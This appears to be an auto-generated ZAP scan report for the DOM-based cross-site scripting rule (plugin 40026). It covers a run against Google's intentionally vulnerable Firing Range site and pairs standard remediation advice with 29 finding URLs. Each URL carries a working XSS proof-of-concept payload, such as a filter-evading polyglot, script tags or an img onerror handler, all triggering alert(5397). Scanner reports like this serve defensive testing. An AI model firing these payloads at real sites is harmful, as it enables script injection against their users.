---
aliases:
  - "CSSDB-0026"
cweId: "79"
cweUri: "https://cwe.mitre.org/data/definitions/79.html"
generatedAt: "2025-09-21T20:00:10Z"
id: "def-40026"
name: "Cross Site Scripting (DOM Based)"
occurrenceCount: "29"
pluginId: "40026"
scan.label: "Google Firing Range run 2"
schemaVersion: "v1"
sourceTool: "zap"
status.open: "29"
wascId: "8"
---

# Cross Site Scripting (DOM Based) (Plugin 40026)

## Detection logic

- Logic: active
- Add-on: domxss
- Source path: `zap-extensions/addOns/domxss/src/main/java/org/zaproxy/zap/extension/domxss/DomXssScanRule.java`
- GitHub: https://github.com/zaproxy/zap-extensions/blob/main/addOns/domxss/src/main/java/org/zaproxy/zap/extension/domxss/DomXssScanRule.java
- Docs: https://www.zaproxy.org/docs/alerts/40026/

### How it detects

Active; threshold: low; strength: low

_threshold: low; strength: low_

## Remediation

Phase: Architecture and Design
Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
Examples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket.

Phases: Implementation; Architecture and Design
Understand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.
For any data that will be output to another web page, especially any data that was received from external inputs, use the appropriate encoding on all non-alphanumeric characters.
Consult the XSS Prevention Cheat Sheet for more details on the types of encoding and escaping that are needed.

Phase: Architecture and Design
For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.

If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.

Phase: Implementation
For every web page that is generated, use and specify a character encoding such as ISO-8859-1 or UTF-8. When an encoding is not specified, the web browser may choose a different encoding by guessing which encoding is actually being used by the web page. This can cause the web browser to treat certain sequences as special, opening up the client to subtle XSS attacks. See CWE-116 for more mitigations related to encoding/escaping.

To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.

Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use an allow list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a deny list). However, deny lists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.

When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if you are expecting colors such as "red" or "blue."

Ensure that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a component is reused or moved elsewhere.

### References
- https://owasp.org/www-community/attacks/xss/
- https://cwe.mitre.org/data/definitions/79.html

## Issues

### GET https://public-firing-range.appspot.com/address/location.hash/assign#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-1c5fb057cd9d2c7d.md|Issue fin-1c5fb057cd9d2c7d]]
#### Observations
- [[occurrences/occ-98ee499bba1ec90c.md|assign]]

### GET https://public-firing-range.appspot.com/address/location.hash/eval#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-cf433c2c9cafebe6.md|Issue fin-cf433c2c9cafebe6]]
#### Observations
- [[occurrences/occ-29e7aa32910c8d60.md|eval]]

### GET https://public-firing-range.appspot.com/address/location.hash/formaction#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-e77d6fe94df77826.md|Issue fin-e77d6fe94df77826]]
#### Observations
- [[occurrences/occ-80ae347e0bad5bcf.md|formaction]]

### GET https://public-firing-range.appspot.com/address/location.hash/function#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-538dfc3d4edbdf12.md|Issue fin-538dfc3d4edbdf12]]
#### Observations
- [[occurrences/occ-e34094914b83d26c.md|function]]

### GET https://public-firing-range.appspot.com/address/location.hash/inlineevent#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-b561520be3dd250b.md|Issue fin-b561520be3dd250b]]
#### Observations
- [[occurrences/occ-dd1e2f72a6666f15.md|inlineevent]]

### GET https://public-firing-range.appspot.com/address/location.hash/replace#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-5ac161352396be19.md|Issue fin-5ac161352396be19]]
#### Observations
- [[occurrences/occ-cadcb1309a0b6864.md|replace]]

### GET https://public-firing-range.appspot.com/address/location.hash/setTimeout#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-0851b99281681447.md|Issue fin-0851b99281681447]]
#### Observations
- [[occurrences/occ-7e2dc31bd385334a.md|setTimeout]]

### GET https://public-firing-range.appspot.com/dom/dompropagation#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-c70cc2729c7febe0.md|Issue fin-c70cc2729c7febe0]]
#### Observations
- [[occurrences/occ-296413ed084b7ecb.md|dompropagation]]

### GET https://public-firing-range.appspot.com/dom/dompropagation/#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-7308af17c6ee94a2.md|Issue fin-7308af17c6ee94a2]]
#### Observations
- [[occurrences/occ-9145bb92ada6368e.md|dompropagation]]

### GET https://public-firing-range.appspot.com/escape/js/html_escape?q=javascript:alert(5397)  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-778b94537447ba6a.md|Issue fin-778b94537447ba6a]]
#### Observations
- [[occurrences/occ-dcd14e079cdf9e82.md|html_escape[q]]]

### GET https://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_eval?q=javascript:alert(5397)  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-b2c5668963885eb1.md|Issue fin-b2c5668963885eb1]]
#### Observations
- [[occurrences/occ-c81044b779bcf089.md|js_eval[q]]]

### GET https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_quoted/DOUBLE_QUOTED_ATTRIBUTE?q=javascript:alert(5397)  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-ad3d8ec6d33a80c2.md|Issue fin-ad3d8ec6d33a80c2]]
#### Observations
- [[occurrences/occ-368ed65706a75225.md|DOUBLE_QUOTED_ATTRIBUTE[q]]]

### GET https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_singlequoted/SINGLE_QUOTED_ATTRIBUTE?q=javascript:alert(5397)  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-6f69259a861b4dd4.md|Issue fin-6f69259a861b4dd4]]
#### Observations
- [[occurrences/occ-8beafdb9a59bce2b.md|SINGLE_QUOTED_ATTRIBUTE[q]]]

### GET https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_unquoted/UNQUOTED_ATTRIBUTE?q=javascript:alert(5397)  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-db9527de500ce4fb.md|Issue fin-db9527de500ce4fb]]
#### Observations
- [[occurrences/occ-eb374e24be5a118d.md|UNQUOTED_ATTRIBUTE[q]]]

### GET https://public-firing-range.appspot.com/reflected/filteredcharsets/body/SpaceDoubleQuoteSlashEquals?q=%3Cscript%3Ealert(5397)%3C/script%3E  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-44fe901891bec145.md|Issue fin-44fe901891bec145]]
#### Observations
- [[occurrences/occ-b4ba40dbbf40e3cf.md|SpaceDoubleQuoteSlashEquals[q]]]

### GET https://public-firing-range.appspot.com/reflected/parameter/body/400?q=%3Cscript%3Ealert(5397)%3C/script%3E  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-dbc5651a507a7b61.md|Issue fin-dbc5651a507a7b61]]
#### Observations
- [[occurrences/occ-c5161e24f20cc64c.md|400[q]]]

### GET https://public-firing-range.appspot.com/reflected/parameter/body/401?q=%3Cscript%3Ealert(5397)%3C/script%3E  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-be5c3f7b9b4d5eb2.md|Issue fin-be5c3f7b9b4d5eb2]]
#### Observations
- [[occurrences/occ-fc9d674919dd1a31.md|401[q]]]

### GET https://public-firing-range.appspot.com/reflected/parameter/body/403?q=%3Cscript%3Ealert(5397)%3C/script%3E  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-7b7046135d6821b7.md|Issue fin-7b7046135d6821b7]]
#### Observations
- [[occurrences/occ-0034f34fbbeb0e30.md|403[q]]]

### GET https://public-firing-range.appspot.com/reflected/parameter/body/404?q=%3Cscript%3Ealert(5397)%3C/script%3E  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-3484a70561074d17.md|Issue fin-3484a70561074d17]]
#### Observations
- [[occurrences/occ-b448eb2218e678dd.md|404[q]]]

### GET https://public-firing-range.appspot.com/reflected/parameter/body/500?q=%3Cscript%3Ealert(5397)%3C/script%3E  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-30fa9694ec1075b2.md|Issue fin-30fa9694ec1075b2]]
#### Observations
- [[occurrences/occ-7f9a6edb41c141e1.md|500[q]]]

### GET https://public-firing-range.appspot.com/reflected/parameter/body?q=%3Cscript%3Ealert(5397)%3C/script%3E  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-0eade41f2fea8b96.md|Issue fin-0eade41f2fea8b96]]
#### Observations
- [[occurrences/occ-29c79eb2f8b48bec.md|body[q]]]

### GET https://public-firing-range.appspot.com/reflected/parameter/head?q=%3Cscript%3Ealert(5397)%3C/script%3E  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-372b8f65490b114f.md|Issue fin-372b8f65490b114f]]
#### Observations
- [[occurrences/occ-4ce4168e9f8d116e.md|head[q]]]

### GET https://public-firing-range.appspot.com/reflected/parameter/iframe_srcdoc?q=%3Cscript%3Ealert(5397)%3C/script%3E  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-7082c72b2d0dd365.md|Issue fin-7082c72b2d0dd365]]
#### Observations
- [[occurrences/occ-467a378e35d2336e.md|iframe_srcdoc[q]]]

### GET https://public-firing-range.appspot.com/reflected/parameter/js_eval?q=javascript:alert(5397)  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-de03b40afdfa2484.md|Issue fin-de03b40afdfa2484]]
#### Observations
- [[occurrences/occ-170eb9b9f2d4ddc5.md|js_eval[q]]]

### GET https://public-firing-range.appspot.com/reflected/parameter/json?q=%3Cscript%3Ealert(5397)%3C/script%3E  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-df213dcaa987a551.md|Issue fin-df213dcaa987a551]]
#### Observations
- [[occurrences/occ-581e0d35e600822c.md|json[q]]]

### GET https://public-firing-range.appspot.com/reflected/parameter/tagname?q=%3Cscript%3Ealert(5397)%3C/script%3E  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-469163fd94e8232b.md|Issue fin-469163fd94e8232b]]
#### Observations
- [[occurrences/occ-0033b5169da6b0fc.md|tagname[q]]]

### GET https://public-firing-range.appspot.com/tags/expression?q=%3Cscript%3Ealert(5397)%3C/script%3E  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-c33dd07ce1e4986f.md|Issue fin-c33dd07ce1e4986f]]
#### Observations
- [[occurrences/occ-7e2286e02d741925.md|expression[q]]]

### GET https://public-firing-range.appspot.com/tags/tag/img?q=%3Cimg%20src=%22random.gif%22%20onerror=alert(5397)%3E  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-b25a8e3a9e0701f4.md|Issue fin-b25a8e3a9e0701f4]]
#### Observations
- [[occurrences/occ-088b7875d8be8fe3.md|img[q]]]

### GET https://public-firing-range.appspot.com/tags/tag?q=%3Cscript%3Ealert(5397)%3C/script%3E  (observations: 1; open:1 triaged:0 fp:0 accepted:0 fixed:0)

- [[findings/fin-6056d4e43a845dab.md|Issue fin-6056d4e43a845dab]]
#### Observations
- [[occurrences/occ-a88a6aac97526542.md|tag[q]]]

